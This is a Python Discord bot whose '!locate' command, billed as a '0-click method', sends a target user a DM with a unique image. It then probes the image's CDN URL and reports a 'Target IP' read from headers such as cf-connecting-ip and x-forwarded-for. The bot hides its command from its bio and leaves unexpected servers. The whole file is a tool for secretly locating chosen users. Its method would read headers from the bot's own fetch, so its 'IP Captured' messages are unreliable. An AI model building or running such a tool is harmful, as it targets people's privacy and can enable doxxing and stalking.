import discord
from discord.ext import commands
import requests
import os
import random
import string
from http.server import HTTPServer, SimpleHTTPRequestHandler
import threading
import asyncio
from io import BytesIO
from PIL import Image, ImageDraw, ImageFont

# Get token from Railway env vars
TOKEN = os.getenv('DISCORD_TOKEN')
if not TOKEN:
    raise ValueError("DISCORD_TOKEN environment variable is not set!")

# Enable all necessary intents
intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True

bot = commands.Bot(command_prefix='!', intents=intents)

# Keep-alive for Railway
def keep_alive():
    server = HTTPServer(('0.0.0.0', 8080), SimpleHTTPRequestHandler)
    print("Keeping alive...")
    server.serve_forever()

p = threading.Thread(target=keep_alive)
p.start()

# Store guilds present at startup
initial_guild_ids = None

@bot.event
async def on_ready():
    global initial_guild_ids
    
    # Remove "!locate" from bio if present
    await update_bio_if_needed()
    
    print(f'Bot ready! Logged in as {bot.user}')
    
    # Capture the IDs of all guilds the bot is currently in
    initial_guild_ids = [g.id for g in bot.guilds]
    print(f"Initial Guilds: {len(initial_guild_ids)}")
    
    await bot.change_presence(activity=discord.Game(name=""))

@bot.event
async def on_guild_join(guild):
    # If we have an initial list, check if this guild is NOT in it
    if initial_guild_ids and guild.id not in initial_guild_ids:
        print(f"New guild joined: {guild.name} ({guild.id}). Leaving...")
        try:
            await guild.leave()
            print(f"Left guild: {guild.name}")
        except Exception as e:
            print(f"Failed to leave {guild.name}: {e}")

def generate_unique_image(random_id):
    """Generates a unique image using Pillow to ensure no caching."""
    img = Image.new('RGB', (400, 400), color=(255, 255, 255))
    d = ImageDraw.Draw(img)
    
    # Draw a unique pattern/text based on the ID
    d.rectangle([50, 50, 350, 350], fill=None, outline=(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255)), width=10)
    
    # Add the ID text to the center
    try:
        font = ImageFont.truetype("arial.ttf", 40)
    except IOError:
        font = ImageFont.load_default()
        
    text = f"ID: {random_id}"
    bbox = d.textbbox((0, 0), text, font=font)
    w = bbox[2] - bbox[0]
    h = bbox[3] - bbox[1]
    x = 200 - w / 2
    y = 200 - h / 2
    d.text((x, y), text, fill=(0, 0, 0), font=font)
    
    buffer = BytesIO()
    img.save(buffer, format='PNG')
    buffer.seek(0)
    return buffer.getvalue()

@bot.command()
async def locate(ctx, user: discord.User):
    """
    Improved 0-Click Method with Unique Images:
    1. Generates a UNIQUE image with a random ID.
    2. Sets Bot Avatar to this unique image.
    3. Sends DM with an EMBED containing this unique image.
    4. Forces Discord client to download the NEW image.
    5. Probes for IP.
    """
    if ctx.guild is None:
        return 

    # 1. Generate unique ID
    random_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
    
    # 2. Generate unique image data
    unique_img_data = generate_unique_image(random_id)
    
    # 3. Set Avatar to the unique image
    try:
        await ctx.bot.user.edit(avatar=unique_img_data)
        print(f"[{random_id}] Avatar set to unique image.")
    except Exception as e:
        print(f"[{random_id}] Error setting avatar: {e}")
        await ctx.send(f"Error setting avatar: {e}")
        return

    # 4. Upload the image to Discord first to get a stable CDN URL
    try:
        file = discord.File(fp=BytesIO(unique_img_data), filename=f"{random_id}.png")
        embed = discord.Embed(title="Check this out!", color=discord.Color.blue())
        embed.set_image(url=f"attachment://{random_id}.png")
        
        # Send the message with the image attached
        msg = await user.send(embed=embed, file=file)
        
        # Also send the raw URL in the DM to ensure it's fetched
        await user.send(f"Image Link: {msg.attachments[0].url}")
        
        await ctx.send(f"👁️ **Target:** {user.name}\n⏳ **Sent unique image. Waiting for load...**")
    except discord.Forbidden:
        await ctx.send(f"Cannot DM {user.name}.")
        return
    except Exception as e:
        print(f"[{random_id}] Error sending DM: {e}")
        await ctx.send(f"Error sending DM: {e}")
        return

    # 5. Wait for the client to process the embed and fetch the image
    print(f"[{random_id}] Waiting 15 seconds for target to view...")
    await asyncio.sleep(15)

    # 6. Probe for IP using the Discord CDN URL of the attachment
    img_url = msg.attachments[0].url
    
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
    
    try:
        probe_resp = requests.get(img_url, headers=headers, timeout=10)
        
        cf_status = probe_resp.headers.get('cf-cache-status', 'Unknown')
        
        # Try multiple headers for IP extraction
        target_ip = (
            probe_resp.headers.get('cf-connecting-ip') or 
            probe_resp.headers.get('x-forwarded-for') or 
            probe_resp.headers.get('x-client-ip') or 
            'Not Found'
        )
        
        if probe_resp.status_code == 200:
            if cf_status == 'HIT':
                result_msg = f"✅ **IP Captured!**\n🌐 **Target IP:** `{target_ip}`\n📡 **Cache:** HIT\n🖼️ **Unique ID:** {random_id}"
            elif cf_status == 'MISS':
                result_msg = f"⚠️ **IP Attempted:** `{target_ip}`\n📡 **Cache:** MISS\n💡 Note: If IP is 'Not Found', the target may have disabled image loading or used a proxy."
            else:
                result_msg = f"ℹ️ **Status:** {probe_resp.status_code}\n🌐 **IP:** `{target_ip}`"
                
            await ctx.send(result_msg)
            
        else:
            await ctx.send(f"❌ Failed to probe image. Status: {probe_resp.status_code}")

    except Exception as e:
        print(f"[{random_id}] Error probing: {e}")
        await ctx.send(f"Error probing: {e}")

async def update_bio_if_needed():
    """Checks if '!locate' is in the bio and removes it."""
    try:
        await bot.fetch_user(bot.user.id)
        current_bio = bot.user.bio or ""
        if "!locate" in current_bio:
            new_bio = current_bio.replace("!locate", "").strip()
            while "  " in new_bio:
                new_bio = new_bio.replace("  ", " ")
            if new_bio != current_bio:
                await bot.user.edit(bio=new_bio if new_bio else None)
                print(f"Bio updated: removed '!locate'")
    except Exception as e:
        print(f"Error updating bio: {e}")

bot.run(TOKEN)